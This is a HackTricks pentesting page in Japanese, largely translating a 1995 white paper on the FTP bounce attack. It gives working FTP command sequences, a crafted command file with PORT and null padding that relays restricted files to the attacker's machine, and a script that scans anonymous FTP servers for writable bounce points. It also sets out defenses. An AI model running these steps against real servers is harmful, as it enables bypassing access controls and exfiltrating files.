```markdown
<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

他のHackTricksをサポートする方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>


# Resume

バウンスFTPサーバーにアクセスできる場合、他のFTPサーバーからファイルをリクエストして（あなたがいくつかの資格情報を知っている場合）、そのファイルを自分のサーバーにダウンロードすることができます。

## Requirements

FTP Middleサーバーで有効なFTP資格情報
被害者FTPサーバーで有効なFTP資格情報
両方のサーバーがPORTコマンドを受け入れる（バウンスFTP攻撃）
FRP Middleサーバー内のいくつかのディレクトリに書き込むことができる
何らかの理由で、中間サーバーが被害者FTPサーバー内であなたよりも多くのアクセス権を持っている（これを利用することになります）

## Steps

1. 自分のFTPサーバーに接続し、被害者サービスがファイルを送信するディレクトリでリッスンするようにパッシブモード（pasvコマンド）にします。
2. FTP Middleサーバーが被害者サーバーに送信するファイルを作成します（エクスプロイト）。このファイルは、被害者サーバーに対して認証を行い、ディレクトリを変更し、ファイルを自分のサーバーにダウンロードするために必要なコマンドのプレーンテキストです。
3. FTP Middleサーバーに接続し、前のファイルをアップロードします。
4. FTP Middleサーバーに被害者サーバーとの接続を確立させ、エクスプロイトファイルを送信させます。
5. 自分のFTPサーバーでファイルをキャプチャします。
6. FTP Middleサーバーからエクスプロイトファイルを削除します。



この投稿のすべての情報は、次から抽出されました: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

#  The FTP Bounce Attack

これは、「FTPサーバーバウンス攻撃」の多くの可能な使用法の一つを議論します。使用されるメカニズムはおそらくよく知られていますが、これまでのところ、それを詳細に説明したり修正することに対する関心は低いか全く存在しません。この特定の例は、標準FTPプロトコルのいくつかの本当に考えられていない側面があることに、読者が気づき、注意を払うようにするために選ばれました。

また、数ヶ月前にこれらの問題について簡単ですが面白い議論をしたimag.frのAlain Knaffにも感謝します。それが私にこれらの問題についてさらに深く考えるきっかけを与えました。

##  The motive

あなたはforeign.frのユーザーで、IPアドレスはF.F.F.Fです。そして、米国のcrypto.comから暗号化ソースコードを取得したいと考えています。crypto.comのFTPサーバーはあなたの接続を許可しますが、あなたのソースIPアドレスが非米国サイトであるため\[DNSからFTPサーバーが判断できる限り\]、暗号化ソースへのアクセスを拒否します。いずれにせよ、crypto.comのサーバーから直接欲しいものを取得することはできません。

しかし、crypto.comはufred.eduが暗号化ソースをダウンロードすることを許可します。なぜならufred.eduも米国内にあるからです。あなたは、ufred.eduの/incomingが匿名ユーザーがファイルをドロップして読み返すことができる世界に書き込み可能なディレクトリであることを知っています。crypto.comのIPアドレスはC.C.C.Cです。

##  The attack

あなたがパッシブモードを行うFTPサーバーを持っていると仮定します。自分のマシンの実際のIPアドレス\[localhostではない\]にFTP接続を開き、ログインします。書き込みアクセス権を持つ便利なディレクトリに変更し、次に行います：
```
```text
pasv
stor foobar
```
以下のアドレスとポートに注意してください。PASVコマンドから返されるF,F,F,F,X,Xです。このFTPセッションは現在停止状態になるので、バックグラウンドに移動するか、別のウィンドウに切り替えて、残りの作業を続けてください。

FTPサーバーのコマンドを含むファイルを作成します。このファイルを"`instrs`"と呼びましょう。内容は以下のようになります：
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
```
F,F,F,F,X,Xは、最初の接続で自分のマシンが提供したのと同じアドレスとポートです。末尾のゴミは、NULLを250個含む追加の行で、約60Kの余分なデータを埋めるのに十分な量です。このフィラーの理由については後で説明します。

ufred.eduにFTP接続を開き、匿名でログインし、/incomingにcdします。次に、このFTPセッションに以下を入力します。これにより、"`instrs`"ファイルのコピーが転送され、その後ufred.eduのFTPサーバーに、あなたのファイルをコマンドとして使用してcrypto.comのFTPサーバーに接続するよう指示します：
```
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z`は、最初のFTP接続を介してあなたのマシン上で"`foobar`"として表示されるはずです。ufred.eduへの接続が一般的なサーバーバグにより自動的に切断されなかった場合は、"`instrs`"を削除して終了することでクリーンアップしてください。そうでなければ、完了するために再接続する必要があります。

##  議論

これにはいくつかの変種があります。PASVリスナー接続は、ファイル書き込みアクセス権を持つ任意のマシン上で開くことができます -- 自分のマシン、ufred.eduへの別の接続、または完全に無関係な場所でも構いません。実際、FTPサーバーである必要はありません -- 既知のTCPポート上でリッスンし、生データをファイルに読み込む任意のユーティリティで十分です。パッシブモードFTPデータ接続は、これを行うための便利な方法に過ぎません。

コマンドファイルの末尾に追加された追加のヌルは、ufredからcryptoへの接続の両端のTCPウィンドウを埋め、コマンド接続がセッション全体が実行されるのに十分な時間開いたままにするためです。そうでないと、ほとんどのFTPサーバーは、制御接続が早期に閉じられると、すべての転送とコマンド処理を中止する傾向があります。データのサイズは、受信ウィンドウと送信ウィンドウの両方を埋めるのに十分であり、一部のOSではかなり大きい\[約30Kのオーダー\]です。両端のOSとそれらのデフォルトのTCPウィンドウサイズの合計を知っている場合は、このサイズをトリミングできます。ターゲットサーバーのコマンドバッファをオーバーランしないように、250文字の行に分割されています -- すでにサーバーに終了するように指示しているので、おそらく学問的ですが。

crypto.comがforeign.frからの\*任意の\*FTPクライアント接続を禁止していて、どのファイルがどこにあるかを確認する必要がある場合は、コマンドファイルに"`list -aR`"を入れて、ufred経由で全ツリーのディレクトリリストを取得することができます。

ターゲットのFTPサーバーにコマンドファイルを取得する際には、バイナリモードではなくASCIIモードを使用する必要があるかもしれません。一部のFTPサーバーは生の改行を処理できますが、他のサーバーはCRLFペアで終了するコマンドラインが必要かもしれません。FTPサーバー以外のデーモンにファイルを取得する際にもこれを念頭に置いてください。

##  他の可能性

このような第三者接続は一方通行のみですが、あらゆる種類のことに使用できます。類似の方法を使用して、ほぼ追跡不可能なメールやニュースを投稿したり、様々なサイトのサーバーを攻撃したり、ディスクを満たしたり、ファイアウォールを越えようとしたり、同時に迷惑をかけて追跡が困難になることができます。少し考えれば、他にも多くの恐ろしい可能性が実現することに気づくでしょう。

この方法で開始された接続はソースポート20から来ますが、一部のサイトは"ftp-data"問題に対処するためにファイアウォールを通過させます。いくつかの目的にとって、これはソースルーティング攻撃の次善の策であり、パケットフィルタに対してソースルーティングが失敗する場合に成功する可能性があります。そして、これはすべて、FTPプロトコル仕様がどのように書かれているかによって可能になっています。制御接続はどこからでも来ることができ、データ接続はどこにでも行くことができます。

##  防御

ネット上には古いFTPサーバーと書き込み可能なディレクトリを持つサイトが常に存在するため、「すべてのFTPサーバーを修正する」と言うのは間違った答えです。しかし、自分のサイトを第三者のバウンスポイントとして使用されること、または他のバウンスポイントが自分に対して使用されることから保護することはできます。

最初に明らかなことは、FTPサーバーが制御接続が発生したのと同じホストにのみデータ接続を行うようにすることです。これは上記の攻撃を防ぐわけではありませんが、PASVリスナーがufred.edu上にある可能性があるため、要件を満たしますが、\*あなたの\*サイトが潜在的なバウンスポイントになるのを防ぎます。また、"プロキシFTP"の概念を破壊しますが、この段落のどこかに非常に小さなバイオリンが隠されています。

次に明らかなことは、予約済みポート、特にポート20からのFTP制御接続を禁止することです。これにより、上記のシナリオが防止されます。

これらのことに加えて、ソースルーティングされたパケットやその他のスプーフィングの手段をブロックする通常の対策が、この種のハックを防ぐために必要です。また、オープンな「インカミング」ディレクトリが本当に必要かどうかを考えてください。

パッシブモードのクライアントデータ接続のみを許可することも可能性の一つですが、まだ多くのFTPクライアントがパッシブを認識していないためです。

##  "緩やかな合意と実行中のコード"

avian.orgで利用可能なこの問題に対処する既存の作業があります\[数ヶ月前からですが\]。"[fixkitsアーカイブ](ftp://ftp.avian.org:/src/fixkits/)"には、偽のPORTコマンドの使用を防ぎ、記録するためのwu-ftpd-2.4へのいくつかの変更が提示されています。他の場所からの最近のセキュリティ修正も含まれており、特定のアプリケーションのセキュリティを強化するためのs/keyサポートや様々なコンパイル時のオプションがあります。

Stan Barberはacadem.comで、これらといくつかの他の修正を本当の更新されたwu-ftpdリリースに統合する作業を行っています。他にもいくつかの異なる取り組みが進行中です。この作業が完了しているとはどこにも主張されていませんが、私がしばらく考えていたことに向けたスタートです -- ネット全体でのwu-ftpd-2.5のリリースで、ネット全体からの貢献があります。wu-ftpdサーバーは非常に人気がありますが、さらなるセキュリティアップグレードが必要です。すべての改善を一つの調整された場所にまとめることができれば素晴らしいことですが、それが実現するようです。もちろん、ベンダー提供のサーバーを実行し続ける人々にはこれは役に立ちません。

クライアント接続のソースポートをサニティチェックすることは、FTPサーバーの修正では具体的には実装されていませんが、この問題はより一般的であるため、Wietseのtcp-wrappersパッケージの変更で実装されています。単純なPORTオプションが追加され、tcpdステージで、呼び出されたデーモンが実行される前に、設定可能なソースポートの範囲からの接続を拒否します。

これの一部は、ここにある匿名FTPエリアの[/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README)によって指摘されています。他のものをつかむ前にこのロードマップを読んでください。

##  メモ

コマンドファイルの末尾にヌルを追加することが、様々なデーモンに対してこれを機能させる鍵でした。通常、望ましいデータを単に送信するだけでは、デーモンにすぐに終了するように指示するため、失敗するでしょう。

WUSTLがwu-ftpdプロジェクト全体を完全に諦めていない場合、彼らはさらなる作業について非常に静かです。Bryan O'Connorは今までに多くの他のプロジェクトに取り組んでいるようです...

これは、unixベースの匿名FTPサーバー上のworld-writeableおよびftp所有のディレクトリとファイルを見つけるための簡単なスクリプトです。これらの書き込み可能な「バウンスポイント」が、このようなものを短時間実行した後にどれだけ出てくるかに驚かされるでしょう。後で、そのような場所からファイルをPUTおよびGETできるかどうかを確認する必要があります。一部のサーバーはアップロードされたファイルを読み取りから保護します。多くはそうではなく、なぜ彼らが今週のトップテンウェアズサイトの中にいるのか疑問に思います...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
BEGIN { idir = "/" ; dirp = 0 }
/.:$/ { idir = $0 ; dirp = 1 ; }
/^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
if (dirp == 1) print idir
dirp = 0
print $0
} '
rm xxx.$$
```
```markdown
これはホワイトペーパーと呼ぶことができるでしょう。avian.orgの[/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack)で入手可能であり、関連する様々な場所にも掲載されています。 \_H\* 950712

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
```
